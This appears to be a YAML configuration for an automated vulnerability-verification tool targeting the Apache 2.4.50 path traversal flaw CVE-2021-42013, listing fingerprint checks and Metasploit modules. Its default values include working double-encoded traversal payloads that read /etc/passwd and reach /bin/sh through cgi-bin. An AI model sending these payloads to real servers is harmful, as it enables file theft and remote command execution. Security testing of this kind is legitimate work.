---
cves:
  - CVE-2021-42013
plausibility:
  - name: HOST-AVAILABILITY
  - name: SERVICE-AVAILABILITY
  - name: SERVICE-FINGERPRINTING
    success:
      - strategy: output
        argument: "Fingerprint: (?i)\\s*.*\\s*Apache\\s*.*\\s*2.4.50" # match the exact Version fingerprint
        conclusion: yes
      - strategy: output
        argument: "Fingerprint: (?i)\\bApache\\b(?!.*\\s*\\d+(\\.\\d*)*)" # also match any string containing Apache if there is no version number present
        conclusion: yes
scanners:
  - name: MSF/scanner/http/apache_normalize_path
    parameters:
      - name: CVE
        description: CVE to exploit since this is a multi-CVE module.
        value_default: CVE-2021-42013
  - name: MSF/exploit-scanner/multi/http/apache_normalize_path_rce
    parameters:
      - name: CVE
        description: CVE to exploit since this is a multi-CVE module.
        value_default: CVE-2021-42013
exploits:
  - name: CVE-2021-41773-42013-FILE-READ
    parameters: 
      - name: HTTP_PATH
        description: Path of a readable directory including the path traversal sequence
        value_default: "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
        value:
          method: event_data
          argument: http.url
  - name: CVE-2021-41773-42013-RCE
    parameters:
      - name: HTTP_PATH
        description: Path of the CGI directory including the path traversal sequence
        value_default: "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
        value:
          method: event_data
          argument: http.url
  - name: MSF/exploit/multi/http/apache_normalize_path_rce
    parameters:
      - name: CVE
        description: CVE to exploit since this is a multi-CVE module.
        value_default: CVE-2021-42013